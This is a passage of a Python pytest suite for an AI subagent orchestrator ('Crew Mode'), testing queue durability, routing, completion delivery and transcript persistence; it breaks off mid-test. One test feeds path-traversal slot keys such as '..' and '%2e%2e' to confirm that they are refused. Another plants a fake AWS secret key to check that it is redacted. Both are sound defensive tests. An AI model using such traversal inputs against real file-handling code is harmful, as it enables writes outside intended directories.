"""Tests for Crew Mode (crew_chat.py): the engineered orchestrator pipeline.

Covers: durable store (queue entry lifecycle, restart reconciliation),
ingest (ack + queue entry), decision executor (validation, spawn/route/
hold/steer/ask/meta), conversation_busy → held, conversation_gone → respawn
with digest + payload replay, completion delivery (summary extraction,
attribution quote, held dispatch, stale completion), burst coalescing,
and mode plumbing (_VALID_MODES, create validation).
"""

from __future__ import annotations

import asyncio
import logging
import os
import subprocess
import sys
import threading
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import kiro_crew.crew_chat as crew_mod
from kiro_crew.crew_chat import CrewOrchestrator, CrewStore


@pytest.fixture(autouse=True)
def _isolate_crew_dir(tmp_path, monkeypatch):  # type: ignore[no-untyped-def]
    monkeypatch.setattr(crew_mod, "data_home", lambda: tmp_path)


def _slot(key: str = "s1", agent: str = "kirocrew") -> MagicMock:
    slot = MagicMock()
    slot.key = key
    slot.agent = agent
    slot.linked_session_key = ""
    # Both default to EMPTY on a real `_ChatSlot`, and a MagicMock's
    # auto-created attribute is truthy — so leaving them unset made a test slot
    # look app-owned and handed `spawn(cwd=)` a mock's repr.
    slot.project = ""
    slot._app = ""
    return slot


def _spawn_info(run_id: str, done: bool = False, error: str = "", result: str = "",
                outcome: str = "") -> MagicMock:
    info = MagicMock()
    info.id = run_id
    info.done = done
    info.error = error
    info.result = result
    info.outcome = outcome or ("failed" if error else "completed")
    return info


def _orch(state: MagicMock | None = None, subagents: MagicMock | None = None) -> CrewOrchestrator:
    state = state or MagicMock()
    subagents = subagents or MagicMock()
    sessions = MagicMock()
    return CrewOrchestrator(state=state, sessions=sessions, subagents=subagents)


def _slot_save(side_effect: BaseException | None = None):
    """Patch the forced slot save `_post_durable` uses as its durability proof.

    Bound on `crew_chat` itself, not on `chat_persistence`: the import is at
    module scope, so the orchestrator holds its OWN reference and patching the
    source module would leave the production path calling the real function.
    """
    return patch(
        "kiro_crew.crew_chat.save_slot_off_loop",
        new=AsyncMock(side_effect=side_effect),
    )


# ── store ──


class TestCrewStore:
    def test_add_and_persist_roundtrip(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("hello")
        st.add_topic("t1", "r1", "title", e["msg_id"])
        st2 = CrewStore("s1")  # fresh load from disk
        assert st2.entry(e["msg_id"])["text"] == "hello"
        assert st2.topic("t1")["active_run_id"] == "r1"

    def test_pending_includes_ask_state(self) -> None:
        st = CrewStore("s1")
        a = st.add_msg("m1")
        b = st.add_msg("m2")
        a["state"] = "ask"
        b["state"] = "done"
        assert [e["msg_id"] for e in st.pending()] == [a["msg_id"]]

    @pytest.mark.parametrize("key", ["..", ".", "", "...", "....", "/", "..\\", "%2e%2e"])
    def test_dots_only_slot_key_is_refused(self, key: str, tmp_path: Path) -> None:
        """A key that sanitizes to nothing but dots must not build a store.

        The sanitizer keeps ``.``, so ``".."`` survives it and ``crew / ".."``
        is the data home — the store's three files would land beside every
        other product file. ``"..."`` is a legal directory name on POSIX but
        Win32 strips trailing dots from a path segment, so it normalizes to
        ``crew`` itself: same collision, one platform over. ``"/"`` and
        ``"..\\"`` fold to ``_`` and ``__`` and are legitimate names, so they
        are here as the boundary of the rule rather than as rejections.
        """
        expect_refusal = not key.strip(".")
        if expect_refusal:
            with pytest.raises(ValueError, match="unsafe crew slot key"):
                CrewStore(key)
        else:
            assert CrewStore(key).dir.parent == tmp_path / "crew"
        # Nothing was written outside the per-slot directory either way.
        assert not (tmp_path / "queue.json").exists()
        assert not (tmp_path / "crew" / "queue.json").exists()

    def test_dot_bearing_keys_that_are_real_names_still_work(self) -> None:
        """Positive control: the rule rejects dots-only, not dots.

        Every key here is writable on Windows too — no segment ends in a dot,
        which Win32 would strip.
        """
        for key in ("a.b", "..a", "s1"):
            st = CrewStore(key)
            st.add_msg("hello")
            assert (st.dir / "queue.json").exists()


# ── ingest ──


class TestIngest:
    @pytest.mark.asyncio
    async def test_ingest_enqueues_acks_and_schedules(self) -> None:
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_decide", new=AsyncMock()) as decide, \
             patch.object(orch, "_post") as post:
            await orch.ingest(slot, "do thing A")
            await asyncio.sleep(0)
        st = orch._store("s1")
        assert len(st.pending()) == 1
        post.assert_called_once()          # instant templated ack
        assert decide.await_count == 1 or decide.call_count == 1

    @pytest.mark.asyncio
    async def test_failed_queue_write_leaves_nothing_queued(self) -> None:
        """A rejected ingress must not be executed later.

        The append lands in memory before the write lands on disk, so a
        transient queue-write failure used to leave a live `pending` entry
        behind an HTTP 500. The user retries; the NEXT successful queue save
        persists the abandoned entry too, and the decision loop routes both —
        the side effects run twice for one request.
        """
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")          # cached, so ingest reuses this instance
        real_save = st._save

        def _save(name: str, data: list) -> object:
            if name != "queue.json":
                return real_save(name, data)
            fut = asyncio.get_running_loop().create_future()
            fut.set_exception(OSError("disk full"))
            st._pending_writes.add(fut)  # exactly what `_save` does on success
            return fut

        with patch.object(st, "_save", side_effect=_save), \
             patch.object(orch, "_decide", new=AsyncMock()) as decide, \
             patch.object(orch, "_post") as post, \
             pytest.raises(OSError, match="disk full"):
            await orch.ingest(slot, "do thing A")

        assert st.pending() == [], "the rejected request is still live in memory"
        # The real harm: a later successful save must not resurrect it.
        st.save()
        await st.wait_writes()
        assert CrewStore("s1").queue == [], "a later save persisted the rejected request"
        # Nothing was promised to the user, and nothing was routed.
        post.assert_not_called()
        assert decide.await_count == 0 and decide.call_count == 0

    @pytest.mark.asyncio
    async def test_failed_write_does_not_poison_later_barriers(self) -> None:
        """`_save` reaps only SUCCESSFUL futures, so a failure left in the
        pending set re-raises on the next unrelated `wait_writes()` — turning
        one failed write into a permanently broken store."""
        orch = _orch()
        st = orch._store("s1")
        real_save = st._save

        def _save(name: str, data: list) -> object:
            if name != "queue.json":
                return real_save(name, data)
            fut = asyncio.get_running_loop().create_future()
            fut.set_exception(OSError("disk full"))
            st._pending_writes.add(fut)
            return fut

        with patch.object(st, "_save", side_effect=_save), \
             patch.object(orch, "_post"), \
             patch.object(orch, "_decide", new=AsyncMock()), \
             pytest.raises(OSError):
            await orch.ingest(_slot(), "do thing A")

        await st.wait_writes()  # must not re-raise the write ingest already owned

    def test_unreadable_store_file_is_not_treated_as_empty(self, tmp_path: Path) -> None:
        """Malformed durable state must NOT read back as "nothing enqueued".

        Collapsing a decode error to `[]` is silently destructive: the next
        `save()` writes that emptiness over the real file, erasing pending
        requests and undelivered forwards. A missing file is still empty.
        """
        st = CrewStore("s1")
        st.add_msg("do not lose me")
        (st.dir / "queue.json").write_text("{ this is not json", encoding="utf-8")
        with pytest.raises(RuntimeError, match="unreadable"):
            CrewStore("s1")
        # The refusal is the point: the damaged bytes are still there to salvage.
        assert (st.dir / "queue.json").read_text(encoding="utf-8") == "{ this is not json"
        # A file that was never written is a legitimate empty store.
        (st.dir / "queue.json").unlink()
        assert CrewStore("s1").queue == []

    def test_enqueue_writes_only_the_queue_file(self) -> None:
        """A rollback-able write must touch ONLY the file it changed.

        With three files per save, `queue.json` can land while `topics.json`
        fails: the caller sees a failure and rolls memory back, but the request
        is already durable and the next restart replays it.
        """
        st = CrewStore("s1")
        st.add_topic("t1", "r1", "title", "m0")
        written: list[str] = []
        real_save = st._save

        def _save(name: str, data: list) -> object:
            written.append(name)
            return real_save(name, data)

        with patch.object(st, "_save", side_effect=_save):
            st.add_msg_awaitable("hello")
        assert written == ["queue.json"]

    @pytest.mark.asyncio
    async def test_undurable_ack_keeps_the_acknowledged_request(self) -> None:
        """`_post_durable` returning False means the TRANSCRIPT row is not
        durable — a mirror, not the record. The queue write already landed, and
        `_post` has already put the echo and the ack on the user's screen, so
        deleting the entry (what round 19 did) loses a request the user was told
        was accepted. Keep it and run it; a transcript gap is the lesser loss."""
        orch = _orch()
        slot = _slot()
        with _slot_save(side_effect=OSError("history locked")), \
             patch.object(orch, "_decide", new=AsyncMock()) as decide, \
             patch.object(orch, "_post", return_value=True):
            await orch.ingest(slot, "do thing A")

        on_disk = CrewStore("s1").queue
        assert [e["text"] for e in on_disk] == ["do thing A"], \
            "an acknowledged request was dropped when only its transcript failed"
        assert on_disk[0]["state"] == "pending"
        # And it is actually dispatched, not merely stored.
        assert decide.await_count + decide.call_count > 0

    @pytest.mark.asyncio
    async def test_dispatch_warms_the_agent_cache_before_spawning(self) -> None:
        """`spawn()` validates the agent from a cache-only read, so an unwarmed
        cache REFUSES a project agent that exists. The dashboard's own spawn
        endpoint pairs the two; crew dispatch must too, and in that order."""
        subagents = MagicMock()
        order: list[str] = []
        subagents.spawn = MagicMock(
            side_effect=lambda *a, **k: order.append("spawn") or _spawn_info("r1"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("build X")
        warm = AsyncMock(side_effect=lambda *a, **k: order.append("warm"))
        with patch("kiro_crew.crew_chat.warm_project_agents_for_spawn", new=warm), \
             patch.object(orch, "_post"):
            await orch._apply(_slot(), st, {"do": "spawn", "msg_id": e["msg_id"],
                                            "title": "build X"})
        assert order == ["warm", "spawn"]

    @pytest.mark.asyncio
    async def test_closed_slot_notification_is_redacted(self) -> None:
        """The closed-slot notification is a FOURTH egress for subagent output,
        and it does not pass through `_post`. A credential in a result must not
        reach a persisted, broadcast notification (nor the topic digest, nor the
        durable forward) — so the redaction happens where `summary` is derived."""
        secret = "aws_secret_access_key=AKIAIOSFODNN7EXAMPLE0000"  # noqa: S105
        state = MagicMock()
        state.get_slot = MagicMock(return_value=None)   # tab closed mid-run
        notes: list[tuple[str, str]] = []
        state.notify = MagicMock(side_effect=lambda k, t, b: notes.append((t, b)))
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("do thing A")
        st.add_topic("r1", "r1", "build X", e["msg_id"])
        orch._owned["r1"] = "s1"
        await orch.on_subagent_done(
            _spawn_info("r1", done=True, result=f"<<<SUMMARY\ndone: {secret}\nSUMMARY", outcome="completed"))

        assert notes, "the closed-slot branch must still notify"
        title, body = notes[0]
        assert secret not in body and secret not in title
        # Same text, same treatment, on the two paths that persist it.
        assert secret not in (st.topic("r1") or {}).get("digest", "")
        assert not any(secret in f.get("body", "") for f in CrewStore("s1").forwards)

    @pytest.mark.asyncio
    async def test_single_flight_folds_reentry(self) -> None:
        orch = _orch()
        slot = _slot()
        lock = orch._locks.setdefault("s1", asyncio.Lock())
        await lock.acquire()
        try:
            await orch._decide(slot)  # lock held → folds into rerun flag
            assert orch._rerun["s1"] is True
        finally:
            lock.release()


# ── executor ──


class TestExecutor:
    @pytest.mark.asyncio
    async def test_spawn_creates_owned_topic(self) -> None:
        subagents = MagicMock()
        subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("build X")
        with patch.object(orch, "_post"):
            await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "build X"})
        assert orch.owns("r1")
        assert st.topic("r1")["status"] == "running"
        assert e["state"] == "accepted"
        # keep=True is mandatory (retention promotes at spawn)
        assert subagents.spawn.call_args.kwargs["keep"] is True
        # anti-nesting + summary contract appended
        assert "Do NOT spawn subagents" in subagents.spawn.call_args.args[0]
        assert "<<<SUMMARY" in subagents.spawn.call_args.args[0]

    @pytest.mark.asyncio
    async def test_unknown_msg_id_rejected(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        await orch._apply(_slot(), st, {"do": "spawn", "msg_id": "nope", "title": "x"})
        assert st.topics == []

    @pytest.mark.asyncio
    async def test_route_to_running_topic_holds(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held"
        assert t["held"] == [e["msg_id"]]

    @pytest.mark.asyncio
    async def test_route_to_idle_topic_continues(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert t["active_run_id"] == "r2"
        assert t["status"] == "running"
        assert orch.owns("r2")
        assert e["state"] == "accepted"

    @pytest.mark.asyncio
    async def test_continue_busy_becomes_held(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_busy: run r1 in flight")
        )
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"  # store thinks idle but manager says busy
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held"
        assert e["msg_id"] in t["held"]

    @pytest.mark.asyncio
    async def test_continue_gone_respawns_with_digest_and_payload(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone: expired")
        )
        subagents.spawn = MagicMock(return_value=_spawn_info("r9"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("original payload text")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        t["digest"] = "prior findings digest"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        seed = subagents.spawn.call_args.args[0]
        assert "prior findings digest" in seed
        assert "original payload text" in seed  # user never re-types
        assert t["topic_id"] == "r9" and orch.owns("r9")

    @pytest.mark.asyncio
    async def test_steer_only_when_running(self) -> None:
        subagents = MagicMock()
        subagents.steer_run = AsyncMock(return_value=(True, "ok"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("prefer python")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        subagents.steer_run.assert_not_awaited()  # executor rejects illegal steer
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        subagents.steer_run.assert_awaited_once()
        assert e["state"] == "steered"

    @pytest.mark.asyncio
    async def test_lost_steer_falls_back_to_held(self) -> None:
        subagents = MagicMock()
        subagents.steer_run = AsyncMock(return_value=(False, "session_starting"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("prefer python")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held" and e["msg_id"] in t["held"]

    @pytest.mark.asyncio
    async def test_ask_and_meta(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        e1 = st.add_msg("ambiguous")
        e2 = st.add_msg("what's in flight?")
        with patch.object(orch, "_post") as post:
            await orch._apply(_slot(), st, {"do": "ask", "msg_id": e1["msg_id"], "question": "new topic?"})
            await orch._apply(_slot(), st, {"do": "meta", "msg_id": e2["msg_id"]})
        assert e1["state"] == "ask"
        assert e2["state"] == "done"
        assert post.call_count == 2


# ── completion delivery ──


class TestCompletion:
    def _delivery_setup(self):  # type: ignore[no-untyped-def]
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("check the feed 403 thing")
        t = st.add_topic("t1", "r1", "feed 403", e["msg_id"])
        e["state"] = "accepted"
        e["run_id"] = "r1"
        orch._owned["r1"] = "s1"
        return orch, st, t, e, slot

    @pytest.mark.asyncio
    async def test_summary_extraction_and_attribution(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        info = _spawn_info("r1", done=True, result="long output <<<SUMMARY root cause found: yml missing >>> tail")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        body = post.call_args.args[1]
        assert "root cause found: yml missing" in body
        assert "↩ re:" in body and "check the feed 403" in body
        assert t["status"] == "idle"
        assert t["digest"].startswith("root cause found")
        assert e["state"] == "done"
        assert not orch.owns("r1")

    @pytest.mark.asyncio
    async def test_missing_summary_falls_back_to_result(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        info = _spawn_info("r1", done=True, result="plain result no delimiter")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        assert "plain result no delimiter" in post.call_args.args[1]

    @pytest.mark.asyncio
    async def test_stale_completion_ignored(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        orch._owned["r_old"] = "s1"  # old run, no topic points at it
        info = _spawn_info("r_old", done=True, result="stale")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        post.assert_not_called()
        assert t["status"] == "running"  # untouched

    @pytest.mark.asyncio
    async def test_held_head_dispatched_on_completion(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        held = st.add_msg("queued follow-up")
        held["state"] = "held"
        t["held"] = [held["msg_id"]]
        orch._subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        info = _spawn_info("r1", done=True, result="<<<SUMMARY done >>>")
        with patch.object(orch, "_post"):
            await orch.on_subagent_done(info)
        assert t["active_run_id"] == "r2"
        assert t["status"] == "running"
        assert orch.owns("r2")

    @pytest.mark.asyncio
    async def test_continuation_carries_the_slot_project(self) -> None:
        """Same cwd contract as the spawn path.

        `spawn` resolves an empty cwd to the pool project BEFORE validating the
        agent, so a slot whose agent is project-local had its continuations
        rejected — and a rejection is read as unresumable, which respawns from
        the digest and throws away the topic's accumulated context.
        """
        orch, st, t, e, slot = self._delivery_setup()
        slot.project = "/proj/alpha"
        held = st.add_msg("queued follow-up")
        held["state"] = "held"
        t["held"] = [held["msg_id"]]
        orch._subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        info = _spawn_info("r1", done=True, result="<<<SUMMARY done >>>")
        with patch.object(orch, "_post"):
            await orch.on_subagent_done(info)
        assert orch._subagents.continue_conversation.call_args.kwargs["cwd"] == "/proj/alpha"

    @pytest.mark.asyncio
    async def test_each_result_delivers_as_its_own_message(self) -> None:
        # One completion = one message, even back-to-back: each forward is the
        # final answer for a DIFFERENT topic, so merging them into one bubble
        # (as the earlier coalescing window did) destroys the per-topic
        # structure the code-driven forward path exists to provide.
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        with patch.object(orch, "_post") as post:
            await orch._queue_forward(slot, "result A")
            await orch._queue_forward(slot, "result B")
        bodies = [c.args[1] for c in post.call_args_list]
        assert bodies == ["result A", "result B"]

    @pytest.mark.asyncio
    async def test_a_lone_result_is_not_delayed(self) -> None:
        # The old coalesce window stalled even a single result; delivery is now
        # synchronous with the completion.
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post") as post:
            await orch._queue_forward(slot, "only result")
            post.assert_called_once()          # no coalesce window to wait out


class TestAnswerMarking:
    """The answer kinds must be distinguishable in the PERSISTED transcript, so
    the UI can keep them out of the reasoning-collapse pane after a reload."""

    @pytest.mark.parametrize("kind,expect_marker", [
        ("crew_result", True), ("crew_meta", True), ("crew_ask", True),
        ("crew_ack", False), ("crew", False),
    ])
    def test_answer_kinds_carry_the_marker_class(self, kind: str, expect_marker: bool) -> None:
        orch = _orch()
        slot = _slot()
        orch._post(slot, "body", kind=kind)
        cls = slot.append.call_args.args[2]
        assert ("crew-reply" in cls) is expect_marker
        assert cls.startswith("msg msg-a")


class TestUnsettledEntriesAreNotStranded:
    """A decision pass can return valid JSON that settles nothing."""

    @pytest.mark.asyncio
    async def test_a_permanently_unsettled_entry_fails_visibly(self) -> None:
        # Empty actions (or actions the executor rejects) leave the entry pending
        # with nothing scheduled to look at it again. The user's whole experience
        # was the acknowledgement, forever — so after a bounded number of tries
        # the entry must fail with something the user can act on.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("something the decider cannot route")

        with patch.object(orch, "_decide_once", new=AsyncMock()), \
                patch.object(orch, "_post", return_value=True) as post:
            await orch._decide(slot)

        assert st.entry(e["msg_id"])["state"] == "failed"
        assert post.called, "the user must be told, not left waiting"
        assert "rephrase" in post.call_args.args[1]

    @pytest.mark.asyncio
    async def test_a_settled_entry_needs_no_retry(self) -> None:
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("routable")

        async def _settle(_slot):
            e["state"] = "accepted"

        with patch.object(orch, "_decide_once", side_effect=_settle), \
                patch.object(orch, "_post", return_value=True) as post:
            await orch._decide(slot)

        assert st.entry(e["msg_id"])["state"] == "accepted"
        assert not post.called, "nothing to apologise for"


class TestGptRoundThirteen:
    """The four blocking findings from the review of 1ec00adf5."""

    def test_the_marker_rides_meta_not_only_the_class(self) -> None:
        # `chat_persistence._build_message_entry` keeps `cls` ONLY for
        # role == "system" and drops it for assistant, while it keeps `meta` for
        # every role — so the periodic slot flush erased a class-only marker.
        # This is why patching one channel per round kept leaving another.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "an answer", kind="crew_result")
        meta = slot.append.call_args.kwargs.get("meta")
        assert isinstance(meta, dict) and meta.get("crew_reply") is True, \
            "the durable marker is missing from assistant meta"
        frame = orch._state.broadcast_ws.call_args.args[1]
        assert (frame.get("meta") or {}).get("crew_reply") is True

    def test_the_ack_carries_no_marker_in_meta(self) -> None:
        orch = _orch()
        slot = _slot()
        orch._post(slot, "On it.", kind="crew")
        assert not (slot.append.call_args.kwargs.get("meta") or {}).get("crew_reply")

    @pytest.mark.asyncio
    async def test_held_queue_drains_even_when_forwarding_fails(self) -> None:
        # Delivery and dispatch are independent obligations of one completion: the
        # topic is idle by now, so a held follow-up left behind it would never be
        # dispatched by any future completion.
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("first task")
        held = st.add_msg("follow up")
        held["state"] = "held"
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "running"
        t["held"] = [held["msg_id"]]
        e["state"] = "accepted"
        e["run_id"] = "r1"
        st.save()
        orch._owned["r1"] = "s1"

        with patch.object(orch, "_queue_forward",
                          new=AsyncMock(side_effect=RuntimeError("disk full"))), \
                patch.object(orch, "_dispatch_continue", new=AsyncMock()) as disp:
            with pytest.raises(RuntimeError):
                await orch.on_subagent_done(_spawn_info("r1", done=True, result="done"))
        disp.assert_awaited(), "the held follow-up was stranded behind an idle topic"

    @pytest.mark.asyncio
    async def test_forward_cleared_only_after_the_transcript_row_is_durable(self) -> None:
        # `_post` schedules the durable transcript append off-loop, so its True is
        # "delivered and scheduled", not "on disk". Dropping the only durable copy
        # on that weaker promise loses the result if a crash beats the append.
        orch = _orch()
        landed: list[str] = []

        async def _never_lands():
            raise OSError("history lock contention")

        with patch.object(orch, "_post", return_value=True), \
                patch.object(crew_mod, "append_if_absent_off_loop",
                             return_value=asyncio.ensure_future(_never_lands())), \
                _slot_save(side_effect=OSError("history lock contention")):
            orch._last_transcript_write = asyncio.ensure_future(_never_lands())
            ok = await orch._post_durable(_slot(), "body", kind="crew_result")
        assert ok is False, "a failed durable append must not report success"
        assert landed == []

    @pytest.mark.asyncio
    async def test_queue_forward_keeps_the_copy_when_the_append_fails(self) -> None:
        # The discriminating case for the CALL SITE: delivery succeeded, but the
        # durable transcript row did not land. `_post`'s True alone would have
        # cleared the only durable copy of the result.
        orch = _orch()
        slot = _slot()

        async def _boom():
            raise OSError("history lock contention")

        def _post_ok(*a, **k):
            orch._last_transcript_write = asyncio.ensure_future(_boom())
            return True

        with patch.object(orch, "_post", side_effect=_post_ok), \
                _slot_save(side_effect=OSError("history lock contention")):
            await orch._queue_forward(slot, "result body")
        await orch._store("s1").wait_writes()
        assert [f["body"] for f in CrewStore("s1").forwards] == ["result body"], \
            "the forward was cleared even though its transcript row never landed"

    @pytest.mark.asyncio
    async def test_an_inline_transcript_append_counts_as_durable(self) -> None:
        # No running loop at append time means the append was written inline, so
        # there is no future to await — but the slot save still has to confirm.
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post", return_value=True), _slot_save() as save:
            orch._last_transcript_write = None
            assert await orch._post_durable(slot, "body", kind="crew_result") is True
        save.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_post_durable_awaits_the_real_helpers_future(self) -> None:
        # The PRODUCTION seam, with `append_if_absent_off_loop` UNPATCHED. The
        # sibling tests hand `_post_durable` a future they built themselves, so
        # they prove "awaits a future when one is present" while staying green
        # even if the helper never produces one — the state that made the barrier
        # a no-op on every running-loop path. Here the append BLOCKS in its
        # worker thread, so the only way the call can still be in flight is that
        # the helper's future was returned and is being awaited.
        orch = _orch()
        gate = threading.Event()
        orch._state.conversation_log.append_if_absent.side_effect = (
            lambda *a, **k: gate.wait(10)
        )
        with _slot_save():
            task = asyncio.ensure_future(
                orch._post_durable(_slot(), "body", kind="crew_result")
            )
            await asyncio.sleep(0.05)
            in_flight = not task.done()
            gate.set()
            ok = await task
        assert in_flight, (
            "_post_durable returned while the transcript append was still "
            "blocked — nothing was awaited, so the helper handed back None "
            "instead of its executor future"
        )
        assert ok is True

    @pytest.mark.asyncio
    async def test_a_repeated_body_still_forces_its_own_durable_write(self) -> None:
        # `append_if_absent` dedupes by CONTENT, so a second identical completion
        # body is a successful NO-OP append: the future resolves while no new row
        # reaches disk. Awaiting only that append would clear the forward for a
        # message that exists nowhere but the in-memory slot.
        orch = _orch()
        slot = _slot()
        orch._state.conversation_log.append_if_absent.return_value = None  # skipped

        with _slot_save(side_effect=OSError("history lock contention")) as save:
            ok = await orch._post_durable(slot, "same body", kind="crew_result")
        assert save.await_count == 1, (
            "the repeated body was never force-persisted — a content-deduped "
            "append cannot prove this row is on disk"
        )
        assert ok is False, "an unconfirmed durable write must not report success"


class TestGptRoundEleven:
    """The two blocking findings from the review of 7346dec2b."""

    @pytest.mark.asyncio
    async def test_durable_lookups_happen_off_the_loop(self) -> None:
        # `_reconcile` legitimately stays on the loop (it posts and schedules),
        # but its per-entry state.json reads scale with the queue — a restart
        # with many accepted entries stalled the loop one stat() at a time.
        st = CrewStore("evid1")
        for i in range(4):
            e = st.add_msg(f"task {i}")
            e["state"] = "accepted"
            e["dispatch_id"] = f"run{i}"
        st.save()
        await st.wait_writes()

        seen: list[str] = []

        def _tracking_read(rid):                       # type: ignore[no-untyped-def]
            seen.append(threading.current_thread().name)
            return None

        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        orch._state.get_slot = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", side_effect=_tracking_read):
            await orch._store_async("evid1")
        assert seen, "no durable lookup happened"
        assert all(nm != threading.main_thread().name for nm in seen), \
            "a durable run lookup ran on the event loop"

    @pytest.mark.asyncio
    async def test_pregathered_evidence_is_not_re_read(self) -> None:
        # The evidence dict is authoritative for the ids it covers; consulting
        # the filesystem again would put the same reads back on the loop.
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state") as rs:
            assert orch._run_started("r1", {"r1": True}) is True
            assert orch._run_started("r2", {"r2": False}) is False
        rs.assert_not_called()

    @pytest.mark.asyncio
    async def test_the_user_message_is_durable_before_it_is_visible(self) -> None:
        # The handler used to append the message and THEN await ingest; on a cold
        # slot that await builds the store, so a process exit in that window left
        # a visible message with no queue entry — unresumable. The property to
        # hold is exactly this: at the moment it becomes visible, the entry is
        # already ON DISK. Asserting that directly needs no barrier patching.
        orch = _orch()
        slot = _slot()
        slot.key = "vis1"                    # own store; no state from other tests
        on_disk_when_shown: list[list[str]] = []
        slot.append = MagicMock(side_effect=lambda *a, **k: on_disk_when_shown.append(
            [e["text"] for e in CrewStore("vis1").queue]))

        with patch.object(orch, "_post", return_value=True), \
                patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "do the thing")

        assert on_disk_when_shown == [["do the thing"]], \
            f"message shown before its queue entry reached disk: {on_disk_when_shown}"

    @pytest.mark.asyncio
    async def test_the_caller_no_longer_appends(self) -> None:
        # Guards the split: if a future edit re-adds an append in api_chat, the
        # message would show up twice.
        import inspect

        from kiro_crew.dashboard import chat_handlers
        src = inspect.getsource(chat_handlers.api_chat)
        crew_branch = src.split('getattr(slot, "mode", "") == "crew"', 1)[1][:600]
        assert "_crew.ingest(" in crew_branch
        assert 'slot.append("user"' not in crew_branch, \
            "api_chat appends the user message again — ingest already does it"


class TestGptRoundNine:
    """The four blocking findings from the review of adb35578e."""

    @pytest.mark.asyncio
    async def test_has_live_work_does_not_build_a_store_on_the_loop(self) -> None:
        # It is called from the async mode-switch handler, and its cold path used
        # `CrewStore(slot_key)` directly — three JSON parses on the loop.
        seen: list[str] = []
        real_init = CrewStore.__init__

        def _tracking_init(self, slot_key):          # type: ignore[no-untyped-def]
            seen.append(threading.current_thread().name)
            real_init(self, slot_key)

        orch = _orch()
        with patch.object(CrewStore, "__init__", _tracking_init):
            await orch.has_live_work("cold1")
        assert seen, "no store was built"
        assert seen[0] != threading.main_thread().name, \
            "has_live_work built its store on the event loop"

    @pytest.mark.asyncio
    async def test_concurrent_first_messages_share_one_store(self) -> None:
        # Both callers miss the cache and both build; publishing unconditionally
        # let the loser keep writing through its own object to the same files.
        orch = _orch()
        with patch.object(orch, "_reconcile") as rec:
            a, b = await asyncio.gather(orch._store_async("race1"),
                                        orch._store_async("race1"))
        assert a is b, "two stores were published for one slot"
        assert rec.call_count == 1, "reconciliation must run for the winner only"

    def test_an_unreadable_state_file_is_not_read_as_never_started(self) -> None:
        # `read_state` returns None for a MISSING file AND for one it could not
